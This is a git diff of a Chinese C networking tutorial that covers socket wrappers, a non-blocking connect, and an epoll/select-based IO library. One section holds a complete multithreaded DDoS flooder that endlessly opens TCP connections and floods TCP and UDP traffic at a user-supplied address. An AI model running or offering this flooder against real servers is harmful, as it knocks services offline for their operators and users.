     址. 上面两个接口属于半成品接口, 用于各种其它接口的扩展内嵌部分. socket_bind 函数
     业务能力很强. 实现也是四平八稳. 对于后面使用的 listen 函数, backlog 参数决定
-    accept 监测过来的链接套接字队列大小, 内部也有个限定值. 只是参考你设置 backlog 是
-    否采纳看实现. 所以有了下面一坨封装
+    accept 监测过来的链接套接字队列大小. listen 开启的监听队列内部也有个限定值. 只是
+    参考你设置 backlog 是否采纳看系统实现. 所以有了下面一坨封装
 
 ```C
 inline socket_t
 socket_tcp(const char * host, uint16_t port) {
-	socket_t s = socket_listen(host, port, SOMAXCONN);
-	if (INVALID_SOCKET == s) {
-		RETURN(INVALID_SOCKET, "socket_listen socket error!");
-	}
-	return s;
+    socket_t s = socket_listen(host, port, SOMAXCONN);
+    if (INVALID_SOCKET == s) {
+	    RETURN(INVALID_SOCKET, "socket_listen socket error!");
+    }
+    return s;
 }
 
 inline socket_t
 socket_udp(const char * host, uint16_t port) {
-	socket_t s = socket_bind(host, port, IPPROTO_UDP, NULL);
-	if (INVALID_SOCKET == s) {
-		RETURN(INVALID_SOCKET, "socket_bind socket error!");
-	}
-	return s;
+    socket_t s = socket_bind(host, port, IPPROTO_UDP, NULL);
+    if (INVALID_SOCKET == s) {
+	    RETURN(INVALID_SOCKET, "socket_bind socket error!");
+    }
+    return s;
 }
 ```
 
@@ -3104,26 +3110,26 @@ socket_udp(const char * host, uint16_t port) {
 ```C
 inline socket_t
 socket_accept(socket_t s, sockaddr_t * addr) {
-    socklen_t len = sizeof sockaddr_t;
+    socklen_t len = sizeof (sockaddr_t);
     return accept(s, (struct sockaddr *)addr, &len);
 }
 
 inline int
 socket_connect(socket_t s, const sockaddr_t * addr) {
-	return connect(s, (const struct sockaddr *)addr, sizeof(*addr));
+    return connect(s, (const struct sockaddr *)addr, sizeof(*addr));
 }
 
 inline int
 socket_connects(socket_t s, const char * ip, uint16_t port) {
-	sockaddr_t addr;
-	int r = socket_addr(ip, port, &addr);
-	if (r < SufBase)
-		return r;
-	return socket_connect(s, &addr);
+    sockaddr_t addr;
+    int r = socket_addr(ip, port, &addr);
+    if (r < SufBase)
+	    return r;
+    return socket_connect(s, &addr);
 }
 ```
 
-**最后来个, 非阻塞的 connect**
+**客户端核心, 非阻塞的 connect**
 
     winds 的 select 和 linux 的 select 是两个完全不同的东西. 然而凡人喜欢把
     它们揉在一起. 非阻塞的 connect 业务是个自带超时机制的 connect. 实现机制无
@@ -3138,93 +3144,93 @@ socket_connects(socket_t s, const char * ip, uint16_t port) {
 ```C
 int
 socket_connecto(socket_t s, const sockaddr_t * addr, int ms) {
-	int n, r;
-	struct timeval to;
-	fd_set rset, wset, eset;
+    int n, r;
+    struct timeval to;
+    fd_set rset, wset, eset;
 
-	// 还是阻塞的connect
-	if (ms < 0) return socket_connect(s, addr);
+    // 还是阻塞的connect
+    if (ms < 0) return socket_connect(s, addr);
 
-	// 非阻塞登录, 先设置非阻塞模式
-	r = socket_set_nonblock(s);
-	if (r < SufBase) {
-		RETURN(r, "socket_set_nonblock error!");
-	}
+    // 非阻塞登录, 先设置非阻塞模式
+    r = socket_set_nonblock(s);
+    if (r < SufBase) {
+	    RETURN(r, "socket_set_nonblock error!");
+    }
 
-	// 尝试连接一下, 非阻塞connect 返回 -1 并且 errno == EINPROGRESS 表示正在建立链接
-	r = socket_connect(s, addr);
-	if (r >= SufBase) goto _return;
+    // 尝试连接一下, 非阻塞connect 返回 -1 并且 errno == EINPROGRESS 表示正在建立链接
+    r = socket_connect(s, addr);
+    if (r >= SufBase) goto _return;
 
-	// 链接还在进行中, linux这里显示 EINPROGRESS，winds应该是 WASEWOULDBLOCK
-	if (errno != ECONNECTED) {
-		CERR("socket_connect error r = %d!", r);
-		goto _return;
-	}
+    // 链接还在进行中, linux这里显示 EINPROGRESS，winds应该是 WASEWOULDBLOCK
+    if (errno != ECONNECTED) {
+	    CERR("socket_connect error r = %d!", r);
+	    goto _return;
+    }
 
-	// 超时 timeout, 直接返回结果 ErrBase = -1 错误
-	r = ErrBase;
-	if (ms == 0) goto _return;
+    // 超时 timeout, 直接返回结果 ErrBase = -1 错误
+    r = ErrBase;
+    if (ms == 0) goto _return;
 
-	FD_ZERO(&rset); FD_SET(s, &rset);
-	FD_ZERO(&wset); FD_SET(s, &wset);
-	FD_ZERO(&eset); FD_SET(s, &eset);
-	to.tv_sec = ms / 1000;
-	to.tv_usec = (ms % 1000) * 1000;
-	n = select((int)s + 1, &rset, &wset, &eset, &to);
-	// 超时直接滚
-	if (n <= 0) goto _return;
+    FD_ZERO(&rset); FD_SET(s, &rset);
+    FD_ZERO(&wset); FD_SET(s, &wset);
+    FD_ZERO(&eset); FD_SET(s, &eset);
+    to.tv_sec = ms / 1000;
+    to.tv_usec = (ms % 1000) * 1000;
+    n = select((int)s + 1, &rset, &wset, &eset, &to);
+    // 超时直接滚
+    if (n <= 0) goto _return;
 
-	// 当连接成功时候,描述符会变成可写
-	if (n == 1 && FD_ISSET(s, &wset)) {
-		r = SufBase;
-		goto _return;
-	}
+    // 当连接成功时候,描述符会变成可写
+    if (n == 1 && FD_ISSET(s, &wset)) {
+	    r = SufBase;
+	    goto _return;
+    }
 
-	// 当连接建立遇到错误时候, 描述符变为即可读又可写
-	if (FD_ISSET(s, &eset) || n == 2) {
-		socklen_t len = sizeof n;
-		// 只要最后没有 error那就 链接成功
-		if (!getsockopt(s, SOL_SOCKET, SO_ERROR, (char *)&n, &len) && !n)
-			r = SufBase;
-	}
+    // 当连接建立遇到错误时候, 描述符变为即可读又可写
+    if (FD_ISSET(s, &eset) || n == 2) {
+	    socklen_t len = sizeof n;
+	    // 只要最后没有 error那就 链接成功
+	    if (!getsockopt(s, SOL_SOCKET, SO_ERROR, (char *)&n, &len) && !n)
+		    r = SufBase;
+    }
 
 _return:
-	socket_set_block(s);
-	return r;
+    socket_set_block(s);
+    return r;
 }
 ```
 
-    核心在于 select 调用触发的异常问题上. 还有就是 errno 信号的判断差异. 最后来个
-    简便封装扩展版本
+    核心在于 select 调用触发的异常问题上. 还有 errno 信号的判断差异. 最后来个
+    封装实战扩展版本
 
 ```C
 socket_t
 socket_connectos(const char * host, uint16_t port, int ms) {
-	int r;
-	sockaddr_t addr;
-	socket_t s = socket_stream();
-	if (s == INVALID_SOCKET) {
-		RETURN(INVALID_SOCKET, "socket_stream is error!");
-	}
+    int r;
+    sockaddr_t addr;
+    socket_t s = socket_stream();
+    if (s == INVALID_SOCKET) {
+	    RETURN(INVALID_SOCKET, "socket_stream is error!");
+    }
 
-	// 构建ip地址
-	r = socket_addr(host, port, &addr);
-	if (r < SufBase)
-		return r;
+    // 构建ip地址
+    r = socket_addr(host, port, &addr);
+    if (r < SufBase)
+	    return r;
 
-	r = socket_connecto(s, &addr, ms);
-	if (r < SufBase) {
-		socket_close(s);
-		RETURN(INVALID_SOCKET, "socket_connecto host port ms = %s, %u, %d!", host, port, ms);
-	}
+    r = socket_connecto(s, &addr, ms);
+    if (r < SufBase) {
+	    socket_close(s);
+	    RETURN(INVALID_SOCKET, "socket_connecto host port ms = %s, %u, %d!", host, port, ms);
+    }
 
-	return s;
+    return s;
 }
 ```
 
-    所有当你的客户端, 想和服务器开始通信, 只需要调用 socket_connectos(host, port, ms)
+    当你的客户端, 想和服务器开始通信, 只需要调用 socket_connectos(host, port, ms)
     后面就可以等待它的回音. 是不是很简单, 一切都妥了. 到这里也许你应该是个合格码农了. 
-    因为基础功底修炼的有些火苗了, 后面的实践也许更加真实, 或者简单.
+    因为基础功底修炼的有些火苗了, 后面的实践也许更加真实, 或者简单. 
     又或许是 ......
 
 ![藤原佐为](./img/藤原佐为.jpg)
@@ -3243,14 +3249,14 @@ socket_connectos(const char * host, uint16_t port, int ms) {
 #define _INT_TOUT   (3000)
 
 struct targ {
-	sockaddr_t addr;
-	char ts[BUFSIZ];
-	char us[BUFSIZ];
+    sockaddr_t addr;
+    char ts[BUFSIZ];
+    char us[BUFSIZ];
 
-	// 攻击次数统计
-	uint64_t connect;
-	uint64_t tcpsend;
-	uint64_t udpsend;
+    // 攻击次数统计
+    uint64_t connect;
+    uint64_t tcpsend;
+    uint64_t udpsend;
 };
 
 // 得到玩家输入的地址信息
@@ -3266,154 +3272,154 @@ void ddos_run(struct targ * arg);
 // ddos attack entrance
 //
 int main(void) {
-	// 记录详细攻击的量, ts and us 是脏数据随便发
-	struct targ arg;
-	arg.udpsend = arg.tcpsend = arg.connect = 0;
+    // 记录详细攻击的量, ts and us 是脏数据随便发
+    struct targ arg;
+    arg.udpsend = arg.tcpsend = arg.connect = 0;
 
-	// 得到玩家的地址信息
-	addr_input(&arg.addr);
+    // 得到玩家的地址信息
+    addr_input(&arg.addr);
 
-	if (!addr_check(&arg.addr))
-		CERR_EXIT("ip or port check is error!!!");
+    if (!addr_check(&arg.addr))
+	    CERR_EXIT("ip or port check is error!!!");
 
-	// 开始要启动线程了
-	ddos_run(&arg);
+    // 开始要启动线程了
+    ddos_run(&arg);
 
-	// :> 开始统计数据
-	puts("connect count		tcp send count			udp send count");
-	for (;;) {
-		printf(" %"PRIu64"			 %"PRIu64"				 %"PRIu64"\n"
+    // :> 开始统计数据
+    puts("connect count		tcp send count			udp send count");
+    for (;;) {
+	    printf(" %"PRIu64"			 %"PRIu64"				 %"PRIu64"\n"
             , arg.connect, arg.tcpsend, arg.udpsend);
-		sh_msleep(_INT_TOUT);
-	}
+	    sh_msleep(_INT_TOUT);
+    }
     return EXIT_SUCCESS;
 }
 
 // 得到玩家输入的地址信息
 void
 addr_input(sockaddr_t * addr) {
-	bool flag = true;
-	int rt = 0;
-	uint16_t port;
-	char ip[_INT_HOST + 1] = { 0 };
+    bool flag = true;
+    int rt = 0;
+    uint16_t port;
+    char ip[_INT_HOST + 1] = { 0 };
 
-	puts("Please input ip and port, example :> 127.0.0.1 8088");
-	printf(":> ");
+    puts("Please input ip and port, example :> 127.0.0.1 8088");
+    printf(":> ");
 
-	// 自己重构scanf, 解决注入漏洞
-	while (rt < _INT_HOST) {
-		char c = getchar();
-		if (isspace(c)) {
-			if (flag)
-				continue;
-			break;
-		}
-		flag = false;
-		ip[rt++] = c;
-	}
-	ip[rt] = '\0';
+    // 自己重构scanf, 解决注入漏洞
+    while (rt < _INT_HOST) {
+	    char c = getchar();
+	    if (isspace(c)) {
+		    if (flag)
+			    continue;
+		    break;
+	    }
+	    flag = false;
+	    ip[rt++] = c;
+    }
+    ip[rt] = '\0';
 
-	rt = scanf("%hu", &port);
-	if (rt != 1)
-		CERR_EXIT("scanf_s addr->host = %s, port = %hu.", ip, port);
+    rt = scanf("%hu", &port);
+    if (rt != 1)
+	    CERR_EXIT("scanf_s addr->host = %s, port = %hu.", ip, port);
 
-	printf("connect check input addr ip:port = %s:%hu.\n", ip, port);
+    printf("connect check input addr ip:port = %s:%hu.\n", ip, port);
 
-	// 下面就是待验证的地址信息
-	if (socket_addr(ip, port, addr) < SufBase)
-		CERR_EXIT("socket_addr ip , port is error = %s, %hu.", ip, port);
+    // 下面就是待验证的地址信息
+    if (socket_addr(ip, port, addr) < SufBase)
+	    CERR_EXIT("socket_addr ip , port is error = %s, %hu.", ip, port);
 }
 
 // 检查IP是否合法
 bool
 addr_check(sockaddr_t * addr) {
-	int r;
-	socket_t s = socket_stream();
-	if (s == INVALID_SOCKET) {
-		RETURN(false, "socket_stream is error!!");
-	}
+    int r;
+    socket_t s = socket_stream();
+    if (s == INVALID_SOCKET) {
+	    RETURN(false, "socket_stream is error!!");
+    }
 
-	r = socket_connecto(s, addr, _INT_TOUT);
-	socket_close(s);
-	if (r < SufBase) {
-		RETURN(false, "socket_connecto addr is timeout = %d.", _INT_TOUT);
-	}
+    r = socket_connecto(s, addr, _INT_TOUT);
+    socket_close(s);
+    if (r < SufBase) {
+	    RETURN(false, "socket_connecto addr is timeout = %d.", _INT_TOUT);
+    }
 
-	return true;
+    return true;
 }
 
 // connect 链接
 static void _connect(struct targ * targ) {
-	// 疯狂connect
-	for (;;) {
-		socket_t s = socket_stream();
-		if (s == INVALID_SOCKET) {
-			CERR("socket_stream is error!");
-			continue;
-		}
+    // 疯狂connect
+    for (;;) {
+	    socket_t s = socket_stream();
+	    if (s == INVALID_SOCKET) {
+		    CERR("socket_stream is error!");
+		    continue;
+	    }
 
-		// 精确统计, 一定要连接成功
-		while (socket_connect(s, &targ->addr) < SufBase)
-			;
+	    // 精确统计, 一定要连接成功
+	    while (socket_connect(s, &targ->addr) < SufBase)
+		    ;
 
-		++targ->connect;
-		socket_close(s);
-	}
+	    ++targ->connect;
+	    socket_close(s);
+    }
 }
 
 // connect + send 连接
 static void _tcpsend(struct targ * targ) {
-	// 疯狂connect
-	for (;;) {
-		socket_t s = socket_stream();
-		if (s == INVALID_SOCKET) {
-			CERR("socket_stream is error!");
-			continue;
-		}
+    // 疯狂connect
+    for (;;) {
+	    socket_t s = socket_stream();
+	    if (s == INVALID_SOCKET) {
+		    CERR("socket_stream is error!");
+		    continue;
+	    }
 
-		// 精确统计, 一定要连接成功
-		while (socket_connect(s, &targ->addr) < SufBase)
-			;
+	    // 精确统计, 一定要连接成功
+	    while (socket_connect(s, &targ->addr) < SufBase)
+		    ;
 
-		// 疯狂发送数据包
-		while (socket_send(s, targ->ts, BUFSIZ) >= SufBase)
-			++targ->tcpsend;
+	    // 疯狂发送数据包
+	    while (socket_send(s, targ->ts, BUFSIZ) >= SufBase)
+		    ++targ->tcpsend;
 
-		socket_close(s);
-	}
+	    socket_close(s);
+    }
 }
 
 // udp send 连接
 static void _udpsend(struct targ * targ) {
-	for (;;) {
-		socket_t s = socket_dgram();
-		if (s == INVALID_SOCKET) {
-			CERR("socket_stream is error!");
-			continue;
-		}
+    for (;;) {
+	    socket_t s = socket_dgram();
+	    if (s == INVALID_SOCKET) {
+		    CERR("socket_stream is error!");
+		    continue;
+	    }
 
-		// 疯狂发送数据包
-		while (socket_sendto(s, targ->us, BUFSIZ, 0, &targ->addr, sizeof(targ->addr)) >= SufBase)
-			++targ->udpsend;
+	    // 疯狂发送数据包
+	    while (socket_sendto(s, targ->us, BUFSIZ, 0, &targ->addr, sizeof(targ->addr)) >= SufBase)
+		    ++targ->udpsend;
 
-		socket_close(s);
-	}
+	    socket_close(s);
+    }
 }
 
 // 目前启动3个类型线程, 2个是connect, 2个是connect + send 2个是 udp send
 void
 ddos_run(struct targ * arg) {
-	// 创建两个 connect 线程
-	CERR_IF(async_run(_connect, arg));
-	CERR_IF(async_run(_connect, arg));
+    // 创建两个 connect 线程
+    CERR_IF(async_run(_connect, arg));
+    CERR_IF(async_run(_connect, arg));
 
-	// 创建两个 connect + send 线程
-	CERR_IF(async_run(_tcpsend, arg));
-	CERR_IF(async_run(_tcpsend, arg));
+    // 创建两个 connect + send 线程
+    CERR_IF(async_run(_tcpsend, arg));
+    CERR_IF(async_run(_tcpsend, arg));
 
-	// 创建两个 udp send 线程
-	CERR_IF(async_run(_udpsend, arg));
-	CERR_IF(async_run(_udpsend, arg));
+    // 创建两个 udp send 线程
+    CERR_IF(async_run(_udpsend, arg));
+    CERR_IF(async_run(_udpsend, arg));
 }
 ```
 
@@ -3428,7 +3434,7 @@ ddos_run(struct targ * arg) {
 
 ## 7.5 基于注册的网络 IO 模型
     
-    对于网络 IO 思路讲解真的很不好扯, 极度偏实战. 此刻讲解的是一种基于注册的 IO 封装.
+    对于网络 IO 思路讲解真的很不好扯, 极度偏实战. 此时讲解的是一种基于注册的 IO 封装.
     最初思路流传于 libevent, 我这里做了一个最简单的模型 libiop. 只对 IO分析, 弱化了
     定时器的功能. 此套 IO 设计思路从应用层向下看(延伸到 socket通信层). 
 
@@ -3459,21 +3465,20 @@ ddos_run(struct targ * arg) {
 #endif // !_H_SIMPLEC_IOP_DEF
 ```
 
-    通过 IOP_XXX 宏的定义, 就已经表明当前 iop 库只是为了解决 IO 相关操作, IOP_FREE 是
-    IOP_IO 的衍生物, 释放销毁相关. 因为有 IO的诞生, 就会有 IO清理操作. 随后 EV_XXX 是
-    对 IOP_IO 操作的喜欢. 因为通信层面主要关心就是, 如何读, 如何写. 衍生出创建, 销毁, 
-    超时 等等辅助操作. 一个简单的网络 IO 最重要的就是要解决好 读 read, 写 write, 创建
-    accept, 销毁 close 这些是其最原始的业务. 所以先从简单的来, 修炼了前面的 socket 封
-    装功法, 那些功法只能点对点 一卫一 战斗. 到了妖魔战场最高效还是群发, 四两拨千斤. 也是
-    被逼的, 真实开发一个物理机服务小万人. 没有一套合理的调度机制处理, 单纯的异步应答, 系
-    统直接炸了. 
+    通过 IOP_XXX 宏的定义, 表明当前 iop 库只是为了解决 IO 相关操作, IOP_FREE 是 IOP_IO 
+    的衍生物, 释放销毁相关. 因为有 IO 的诞生, 就会有 IO 清理操作. 随后 EV_XXX 是对 
+    IOP_IO 操作的喜欢. 因为通信层面主要关心就是, 如何读, 如何写. 衍生出创建, 销毁, 超时
+    等等辅助操作. 一个简单的网络 IO 最重要的就是要解决好 读 read, 写 write, 创建 accept,
+    销毁 close 这些是其最原始的业务. 所以先从简单的来, 修炼了前面的 socket 封装功法, 那些
+    功法只能点对点一卫一战斗. 到了妖魔战场最高效还是群伤. 也是被逼的, 真实开发一个物理机服
+    务小万人. 没有一套合理的调度机制处理, 单纯的异步应答, 系统直接炸了. 
 
     朴实中表露些许疲惫. 继续说 iop_def.h 接口设计原理. 
 
 ![简单IO做的操作](./img/简单IO做的操作.png)
 
-    上面就是一个简单到不能再简单的一套 socket -> poll -> io -> rpc 机制(名词可以自行查)
-    . 我们这里先通过 libiop 解决到 io 和 poll 的部分.  继续看关于其它局部代码设计意图
+    上面就是简单到不能再简单的一套 socket -> poll -> io -> rpc 机制(名词可以自行查)
+    . 我们这里先通过 libiop 解决到 io 和 poll 的部分. 继续看关于其它局部代码设计意图
 
 ```C
 //
@@ -3538,11 +3543,11 @@ typedef int (* iop_dispatch_f)(iopbase_t base, uint32_t id);
 typedef void (* iop_f)(iopbase_t base, uint32_t id, void * arg);
 ```
 
-    没有办法, 因为网络封装这块偏重. 小篇幅难以搞定全部. 随后讲解 poll 可以让你爽. 
-    iop_parse_f 处理的是 recv 返回的时候需要干的事情, 无外乎解析, 封包什么的. 
-    iop_processor_f 是处理 send 事件. iop_event_f 是基础通用事件. iop_dispatch_f
-    用于每次事件调度处理事件, 属于 iop 内部处理 poll 过程来的消息. iop_f 也是内部
-    使用的行为接口, 用于 connect, destroy 的时候内部触发的默认事件. 
+    网络封装这块偏重. 小篇幅难以搞定全部. 随后讲解 poll 可以让你爽. iop_parse_f 
+    处理的是 recv 返回的时候需要干的事情, 无外乎解析, 封包什么的. iop_processor_f
+    是处理 send 事件. iop_event_f 是基础通用事件. iop_dispatch_f 用于每次事件调度
+    处理事件, 属于 iop 内部处理 poll 过程来的消息. iop_f 也是内部使用的行为接口, 
+    用于 connect, destroy 的时候内部触发的默认事件. 
 
     说真的, 看的头痛, 主要意图是为了引发作者思考, 以后会自我建构. 因为每个人对封装
     的理解都很不一样, 共同点是为了解决某个问题. 问题解决了, 自己就锻炼了. 看最终总
@@ -3601,29 +3606,29 @@ struct iopbase {
 // events	: 事件合集
 //
 #define IOP_CB(base, iop, events) \
-	do { \
-		if(iop->type != IOP_FREE) { \
-			int $type = iop->fevent(base, iop->id, events, iop->arg); \
-			if ($type >= SufBase) \
-				iop->lastt = base->curt; \
-			else { \
+    do { \
+        if(iop->type != IOP_FREE) { \
+            int $type = iop->fevent(base, iop->id, events, iop->arg); \
+            if ($type >= SufBase) \
+                iop->lastt = base->curt; \
+            else { \
                 extern int iop_del(iopbase_t base, uint32_t id); \
-				iop_del(base, iop->id); \
+                iop_del(base, iop->id); \
             } \
-		} \
-	} while(0)
+        } \
+    } while(0)
 ```
 
-    其中 struct tstr rbuf[1]; 用法等同于在栈上声明的字符串类型. 方便使用
-    统一接口. IOP_CB 是对每个 iop 控制玩家对象, 基于 event 事件标识进行回调. 
-    对于上面结构部分. 合理的做法在 github 找到我的源码, 练习观摩一遍. 
+    其中 struct tstr rbuf[1]; 用法等同于在栈上声明的字符串类型. 方便使用 tstr 统一
+    接口. IOP_CB 是对每个 iop 控制玩家对象, 基于 event 事件标识进行回调. 
+    对于上面结构部分. 合理的做法在 github 找到源码, 练习观摩一遍. 
 
 ### 7.5.1 libiop poll 模型构建
 
     上面结构中是否注意了 iopbase_t::struct iopop op 事件模型的内部实现. 它就是整个
-    网络层面 socket 监测核心. 释放, 调度, 添加, 删除, 修改. 扯一点, 上层语言独立抽出
-    释放过程, 还是挺爽的. 下面就是一个你很容易看懂, 也是分析基础, 为 struct iopbase
-    构建 struct iopop 接口.
+    网络层面 socket 调度核心. 释放, 调度, 添加, 删除, 修改. 扯一点, 上层语言独立抽
+    出释放过程, 还是挺爽的. 下面就是一个你很容易看懂, 也是分析基础, 为
+    struct iopbase 构建 struct iopop 接口.
 
     首先看 iop_poll.h 接口设计文件
 
@@ -3700,7 +3705,7 @@ static inline uint32_t _to_what(uint32_t events) {
 ```C
 // epoll 句柄释放
 static void _epolls_free(iopbase_t base) {
-	struct epolls * mdata = base->mdata;
+    struct epolls * mdata = base->mdata;
     if (mdata) {
         base->mdata = NULL;
         if (mdata->efd >= 0)
@@ -3716,37 +3721,37 @@ static void _epolls_free(iopbase_t base) {
 ```C
 // epoll 事件调度处理
 static int _epolls_dispatch(iopbase_t base, uint32_t timeout) {
-	int i, n = 0;
-	iop_t iop;
+    int i, n = 0;
+    iop_t iop;
     uint32_t what;
-	struct epolls * mdata = base->mdata;
+    struct epolls * mdata = base->mdata;
 
-	do
-		n = epoll_wait(mdata->efd, mdata->evs, mdata->ets, timeout);
-	while (n < SufBase && errno == EINTR);
+    do
+        n = epoll_wait(mdata->efd, mdata->evs, mdata->ets, timeout);
+    while (n < SufBase && errno == EINTR);
 
-	// 得到当前时间
-	time(&base->curt);
-	for (i = 0; i < n; ++i) {
-		struct epoll_event * ev = mdata->evs + i;
-		uint32_t id = ev->data.u32;
-		if (id >= 0 && id < base->maxio) {
-			iop = base->iops + id;
-			if (id < base->maxio) {
-				iop = base->iops + id;
-				what = _to_what(ev->events);
-				IOP_CB(base, iop, what);
-			}
-		}
-	}
-	return n;
+    // 得到当前时间
+    time(&base->curt);
+    for (i = 0; i < n; ++i) {
+        struct epoll_event * ev = mdata->evs + i;
+        uint32_t id = ev->data.u32;
+        if (id >= 0 && id < base->maxio) {
+            iop = base->iops + id;
+            if (id < base->maxio) {
+                iop = base->iops + id;
+                what = _to_what(ev->events);
+                IOP_CB(base, iop, what);
+            }
+        }
+    }
+    return n;
 }
 ```
 
-    其中和事件 IOP_CB 关联起来了, 内部调度完毕之后, 开始走咱们 iop 自定义的消息处理
-    _to_what -> IOP_CB 注册的消息事件. 这种思路是交叉耦合. 上层语言中封装用的很多. 
-    最后我们会给出一个元婴功法来解耦合. 简化动作, 抛开上层统一调用. 随后处理无外乎就是
-    对 epoll 接口使用的理解
+    以上就和事件 IOP_CB 关联起来了, 内部调度完毕之后, 开始走咱们 iop 自定义的消息
+    处理 _to_what -> IOP_CB 注册的消息事件. 这种思路是交叉耦合. 上层语言中封装用的
+    很多. 最后我们会给出一个元婴功法来解耦合. 简化动作, 抛开上层统一调用. 随后处理无
+    外乎就是对 epoll 接口使用的理解
 
 ```C
 // epoll 添加处理事件
@@ -3788,7 +3793,7 @@ iop_poll$select.h
 #if !defined(_HAVE_EPOLL)
 
 #include <time.h>
-#include <iop_poll.h>
+#include "iop_poll.h"
 
 struct selects {
 #ifdef __GNUC__
@@ -4435,17 +4440,17 @@ static struct iops * _iops_create(
     iop_parse_f fparser, iop_processor_f fprocessor,
     iop_f fconnect, iop_f fdestroy, iop_event_f ferror) {
     struct iops * sarg;
-	// 构建 socket tcp 服务
-	socket_t s = socket_tcp(host, port);
-	if (s == INVALID_SOCKET) {
-		RETURN(NULL, "socket_tcp err = %s | %u.", host, port);
-	}
+    // 构建 socket tcp 服务
+    socket_t s = socket_tcp(host, port);
+    if (s == INVALID_SOCKET) {
+        RETURN(NULL, "socket_tcp err = %s | %u.", host, port);
+    }
 
-	// 构建系统参数, 并逐个填充内容
-	if ((sarg = malloc(sizeof(struct iops))) == NULL) {
-		socket_close(s);
-		RETURN(NULL, "calloc struct ioptcp is error!");
-	}
+    // 构建系统参数, 并逐个填充内容
+    if ((sarg = malloc(sizeof(struct iops))) == NULL) {
+        socket_close(s);
+        RETURN(NULL, "calloc struct ioptcp is error!");
+    }
 
     // 如果创建最终 iopbase_t 对象失败, 直接返回
     if ((sarg->base = iop_create()) == NULL) {
@@ -4455,12 +4460,12 @@ static struct iops * _iops_create(
     }
 
     sarg->irun = true;
-	sarg->timeout = timeout;
+    sarg->timeout = timeout;
     sarg->fparser = fparser;
     sarg->fprocessor = fprocessor;
-	sarg->fconnect = fconnect;
-	sarg->fdestroy = fdestroy;
-	sarg->ferror = ferror;
+    sarg->fconnect = fconnect;
+    sarg->fdestroy = fdestroy;
+    sarg->ferror = ferror;
     // 添加主 iop 对象, 永不超时
     if (SOCKET_ERROR == 
         iop_add(sarg->base, s, EV_READ, -1, (iop_event_f)_fconnect, sarg)) {
@@ -4479,29 +4484,29 @@ static struct iops * _iops_create(
 
 ```C
 static int _fconnect(iopbase_t base, uint32_t id, uint32_t events, struct iops * sarg) {
-	int r;
-	iop_t iop;
-	socket_t s;
+    int r;
+    iop_t iop;
+    socket_t s;
 
-	if (events & EV_READ) {
-		iop = base->iops + id;
-		s = socket_accept(iop->s, NULL);
-		if (INVALID_SOCKET == s) {
-			RETURN(ErrFd, "socket_accept is error id = %u.", id);
-		}
+    if (events & EV_READ) {
+        iop = base->iops + id;
+        s = socket_accept(iop->s, NULL);
+        if (INVALID_SOCKET == s) {
+            RETURN(ErrFd, "socket_accept is error id = %u.", id);
+        }
 
-		r = iop_add(base, s, EV_READ, sarg->timeout, _fdispatch, NULL);
-		if (r < SufBase) {
-			socket_close(r);
-			RETURN(r, "iop_add EV_READ timeout = %d, r = %u", sarg->timeout, r);
-		}
+        r = iop_add(base, s, EV_READ, sarg->timeout, _fdispatch, NULL);
+        if (r < SufBase) {
+            socket_close(r);
+            RETURN(r, "iop_add EV_READ timeout = %d, r = %u", sarg->timeout, r);
+        }
 
-		iop = base->iops + r;
-		iop->sarg = sarg;
-		sarg->fconnect(base, r, iop->arg);
-	}
+        iop = base->iops + r;
+        iop->sarg = sarg;
+        sarg->fconnect(base, r, iop->arg);
+    }
 
-	return SufBase;
+    return SufBase;
 }
 ```
 
@@ -4511,91 +4516,91 @@ static int _fconnect(iopbase_t base, uint32_t id, uint32_t events, struct iops *
 
 ```C
 static int _fdispatch(iopbase_t base, uint32_t id, uint32_t events, void * arg) {
-	int r, n;
-	iop_t iop = base->iops + id;
+    int r, n;
+    iop_t iop = base->iops + id;
     struct iops * sarg = iop->sarg;
 
-	// 销毁事件
-	if (events & EV_DELETE) {
-		sarg->fdestroy(base, id, arg);
-		return SufBase;
-	}
+    // 销毁事件
+    if (events & EV_DELETE) {
+        sarg->fdestroy(base, id, arg);
+        return SufBase;
+    }
 
-	// 读事件
-	if (events & EV_READ) {
-		n = iop_recv(base, id);
-		// 服务器关闭, 直接返回关闭操作
-		if (n == ErrClose)
-			return ErrClose;
+    // 读事件
+    if (events & EV_READ) {
+        n = iop_recv(base, id);
+        // 服务器关闭, 直接返回关闭操作
+        if (n == ErrClose)
+            return ErrClose;
 
-		if (n < SufBase) {
-			r = sarg->ferror(base, id, EV_READ, arg);
-			return r;
-		}
+        if (n < SufBase) {
+            r = sarg->ferror(base, id, EV_READ, arg);
+            return r;
+        }
 
-		for (;;) {
-			// 读取链接关闭
-			n = sarg->fparser(iop->rbuf->str, iop->rbuf->len);
-			if (n < SufBase) {
-				r = sarg->ferror(base, id, EV_CREATE, arg);
-				if (r < SufBase)
-					return r;
-				break;
-			}
-			if (n == SufBase)
-				break;
+        for (;;) {
+            // 读取链接关闭
+            n = sarg->fparser(iop->rbuf->str, iop->rbuf->len);
+            if (n < SufBase) {
+                r = sarg->ferror(base, id, EV_CREATE, arg);
+                if (r < SufBase)
+                    return r;
+                break;
+            }
+            if (n == SufBase)
+                break;
 
-			r = sarg->fprocessor(base, id, iop->rbuf->str, n, arg);
-			if (SufBase <= r) {
-				if (n == iop->rbuf->len) {
-					iop->rbuf->len = 0;
-					break;
-				}
-				tstr_popup(iop->rbuf, n);
-				continue;
-			}
-			return r;
-		}
+            r = sarg->fprocessor(base, id, iop->rbuf->str, n, arg);
+            if (SufBase <= r) {
+                if (n == iop->rbuf->len) {
+                    iop->rbuf->len = 0;
+                    break;
+                }
+                tstr_popup(iop->rbuf, n);
+                continue;
+            }
+            return r;
+        }
 
-	}
+    }
 
-	// 写事件
-	if (events & EV_WRITE) {
-		if (iop->sbuf->len <= 0)
-			return iop_mod(base, id, events);
+    // 写事件
+    if (events & EV_WRITE) {
+        if (iop->sbuf->len <= 0)
+            return iop_mod(base, id, events);
 
-		n = socket_send(iop->s, iop->sbuf->str, iop->sbuf->len);
-		if (n < SufBase) {
+        n = socket_send(iop->s, iop->sbuf->str, iop->sbuf->len);
+        if (n < SufBase) {
             // EINPROGRESS : 进程正在处理; EWOULDBOCK : 当前缓冲区已经写满可以继续写
-			if (errno != EINPROGRESS && errno != EWOULDBOCK) {
-				r = sarg->ferror(base, id, EV_WRITE, arg);
-				if (r < SufBase)
-					return r;
-			}
-			return SufBase;
-		}
-		if (n == SufBase) return SufBase;
+            if (errno != EINPROGRESS && errno != EWOULDBOCK) {
+                r = sarg->ferror(base, id, EV_WRITE, arg);
+                if (r < SufBase)
+                    return r;
+            }
+            return SufBase;
+        }
+        if (n == SufBase) return SufBase;
 
-		if (n >= (int)iop->sbuf->len)
